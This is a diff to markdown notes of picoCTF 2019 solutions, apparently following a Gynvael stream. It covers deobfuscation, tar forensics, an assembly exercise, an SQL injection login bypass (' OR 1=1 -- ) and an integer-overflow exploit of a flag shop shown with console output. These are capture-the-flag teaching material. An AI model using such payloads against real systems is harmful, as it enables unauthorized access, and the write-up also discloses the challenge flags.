@@ -588,7 +588,7 @@ if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6'))
 if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
 ```
 
-We can use the javascript console to figure out that _0x4b5b('0x2') is just substring so all the checkpass[_0x4b5b('0x2')] can be replaced with checkpass['substring']
+We can use the javascript console to figure out that \_0x4b5b('0x2') is just substring so all the checkpass[\_0x4b5b('0x2')] can be replaced with checkpass['substring']
 ```js
 if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
 if (checkpass['substring'](7, 9) == '{n')
@@ -600,6 +600,7 @@ if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
 if (checkpass['substring'](12, 16) == _0x4b5b('0x7'))
 ```
 
+
 Remove redundant checks
 ```js
 if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
@@ -608,7 +609,7 @@ if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
 if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
 ```
 
-Use the javascript console to figure out what _0x4b5b('0x3') and so on are.
+Use the javascript console to figure out what \_0x4b5b('0x3') and so on are.
 ```js
 if (checkpass['substring'](0, 8) == "picoCTF{")
 if (checkpass['substring'](8, 16) == "not_this")
@@ -1255,7 +1256,7 @@ It looks like the exploit actually worked in gdb. When you run a program using g
 To confirm that we're actually overwriting the return address on the shell server outside of gdb, we can look for an instruction/function in the binary that will allow us to see if we have control of the return address. Gynvael looks for the 0xEBFE or infinite loop instruction in the binary, but there isn't one. Instead we can try calling `puts("Welcome to 64-bit. Give me a string that gets you the flag: ");` since that will show us if we overwrite the return address. This technique is a common strategy for confirming that we have control of the return address.  
 
 These two lines are what we want called to call the puts() function in main().
-```
+```console
 $ objdump -Mintel -d vuln
 ...
   400834:       48 8d 3d ed 00 00 00    lea    rdi,[rip+0xed]        # 400928 <_IO_stdin_used+0x48>
@@ -1292,9 +1293,247 @@ Segmentation fault (core dumped)
 
 For some reason the program was crashing on the `push rbp` instruction (probably due to stack alignment).  
 
-
-
 ## like1000 - Forensics
+Gynvael fails figure out how to use 7zip, then proceeds to try extracting the tar with the following script: 
+```python
+#!/usr/bin/python
+import os
+for i in xrange(1000, 0, -1):
+  os.system('tar -xf %i.tar' % i)
+  with open("filler.txt") as f:
+    print(f.read())
+```
+
+The above script *does* work in getting the flag, but tar files are sort of just files concatenated together, so there's no need for the above script to process the tar in a recurisve way.  
+
+Gynvael just opens up a hex editor and finds the magic header for the PNG (89 50 4e 47). He then deletes everything before that header and saves the file. Open in an image viewer as a png and there's the flag.
+
+## vault-door-4
+Just print the myBytes array:
+```python
+print bytearray([106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
+            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
+            0142, 0131, 0164, 063 , 0163, 0137, 062 , 066 ,
+            '7' , 'e' , '0' , '3' , 'd' , '1' , '1' , '6'])
+```
+
+## Irish-Name-Repo 1 - Web Exploitation
+Test for SQL injection by putting `' "-` in the username. This leads to a `HTTP ERROR 500` which tells us it's probably vulnerable to SQL injection.  
+
+When looking at the source, we see a hidden input field, so we set debug to 1
+```html
+<input type="hidden" name="debug" value="1">
+```
+
+When we sent the same payload as before (`' "-`), we get some debug output:
+```sql
+SQL query: SELECT * FROM users WHERE name='' "-' AND password=''
+```
+We want the query to look like this:
+```sql
+SELECT * FROM users WHERE name='' OR 1=1 -- 
+```
+The space after `--` matters since some versions of SQL need it there.
+Send the following as the username:`' OR 1=1 -- `
+
+## flag_shop - General Skills
+This is the piece of code we want to execute to display the flag:
+```c
+if(account_balance > 100000) {
+  FILE *f = fopen("flag.txt", "r");
+  if(f == NULL){
+      printf("flag not found: please run this on the server\n");
+      exit(0);
+    }
+  char buf[64];
+  fgets(buf, 63, f);
+  printf("YOUR FLAG IS: %s\n", buf);
+}
+```
+We need `account_balance`  to be greater than $100,000 to "buy" the flag, but unfortunately we only have $1100 in our account.  
+
+Luckily `account_balance` is a signed integer, so `if(account_balance > 100000)` is vulnerable to an integer overflow/integer underflow attack.  
+
+If we keep on subtracting from our account balance by buying a bunch of the fake flags, we can eventually get account_balance to be greater than $100,000.  
+
+If we buy more than around 2 billion worth of flags, the worth of the flags will wrap around to around negative 2 billion. Then when we subtract a negative amount of money from our balance, it actually adds all that money to our account.  
+
+Each "fake" flag costs 900 to buy, so we need to buy around 2386092 fake flags since 2147483647/900=2386092. But in order to get *past* 2147483647, we need more than that. We also need to take the intial balance of 1100 into account as well.  So we have to buy around 2386095 fake flags to get our account balance to a very large positive number. Then with that balance we can buy the real flag.
+```console
+$ nc 2019shell1.picoctf.com 63894
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+1
+These knockoff Flags cost 900 each, enter desired quantity
+2386095
+
+The final cost is: -2147481796
+
+Your current balance after transaction: 2147482896
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+2
+1337 flags cost 100000 dollars, and we only have 1 in stock
+Enter 1 to buy one1
+YOUR FLAG IS: picoCTF{m0n3y_bag5_818a7f84}
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+```
+
+## asm1 - Reverse Engineering
+We get this:
+```assembly
+asm1:
+        <+0>:   push   ebp
+        <+1>:   mov    ebp,esp
+        <+3>:   cmp    DWORD PTR [ebp+0x8],0x767
+        <+10>:  jg     0x512 <asm1+37>
+        <+12>:  cmp    DWORD PTR [ebp+0x8],0x1f3
+        <+19>:  jne    0x50a <asm1+29>
+        <+21>:  mov    eax,DWORD PTR [ebp+0x8]
+        <+24>:  add    eax,0xb
+        <+27>:  jmp    0x529 <asm1+60>
+        <+29>:  mov    eax,DWORD PTR [ebp+0x8]
+        <+32>:  sub    eax,0xb
+        <+35>:  jmp    0x529 <asm1+60>
+        <+37>:  cmp    DWORD PTR [ebp+0x8],0xcde
+        <+44>:  jne    0x523 <asm1+54>
+        <+46>:  mov    eax,DWORD PTR [ebp+0x8]
+        <+49>:  sub    eax,0xb
+        <+52>:  jmp    0x529 <asm1+60>
+        <+54>:  mov    eax,DWORD PTR [ebp+0x8]
+        <+57>:  add    eax,0xb
+        <+60>:  pop    ebp
+        <+61>:  ret
+```
+
+Since this is ctf challenge, Gynvael says to just run it unless you're learning asm.
+
+Fix the jumps, get rid of the numbers, and get rid of PTR so it compiles:
+```assembly
+[bits 32]
+asm1:
+
+push   ebp
+mov    ebp,esp
+cmp    DWORD [ebp+0x8],0x767
+jg     asm1+37
+cmp    DWORD [ebp+0x8],0x1f3
+jne    asm1+29
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+jmp    asm1+60
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60
+cmp    DWORD [ebp+0x8],0xcde
+jne    asm1+54
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+pop    ebp
+ret    
+```
+
+Push the argument and a junk return address onto the stack
+```
+[bits 32] ; 32 bit since esp instead of rsp
+asm1:
+push   0x529
+push   0x41414141
+push   ebp
+mov    ebp,esp
+cmp    DWORD [ebp+0x8],0x767
+jg     asm1+37
+cmp    DWORD [ebp+0x8],0x1f3
+jne    asm1+29
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+jmp    asm1+60
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60
+cmp    DWORD [ebp+0x8],0xcde
+jne    asm1+54
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+pop    ebp
+ret    
+```
+
+Add 10 to every asm+offset since the two push instruction we added are 10 bytes
+```
+[bits 32] ; 32 bit since esp instead of rsp
+asm1:
+push   0x529
+push   0x41414141
+push   ebp
+mov    ebp,esp
+cmp    DWORD [ebp+0x8],0x767
+jg     asm1+37+10
+cmp    DWORD [ebp+0x8],0x1f3
+jne    asm1+29+10
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+jmp    asm1+60+10
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60+10
+cmp    DWORD [ebp+0x8],0xcde
+jne    asm1+54+10
+mov    eax,DWORD [ebp+0x8]
+sub    eax,0xb
+jmp    asm1+60+10
+mov    eax,DWORD [ebp+0x8]
+add    eax,0xb
+pop    ebp
+ret    
+```
+
+Compile and run with [asmloader](https://github.com/gynvael/asmloader):
+```console
+$ nasm test.S
+$ gdb ./asmloader
+(gdb) run test
+(gdb) i r eax
+```
+The returned value is stored in eax per [calling conventions](https://www.agner.org/optimize/calling_conventions.pdf)
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
@@ -1306,8 +1545,6 @@ For some reason the program was crashing on the `push rbp` instruction (probably
 
 ## TODO 
 * Fix all the weird non ascii apostrophes and double quotes
-* Probably syntax highlighting for some of the code snippets
-
 
 
 
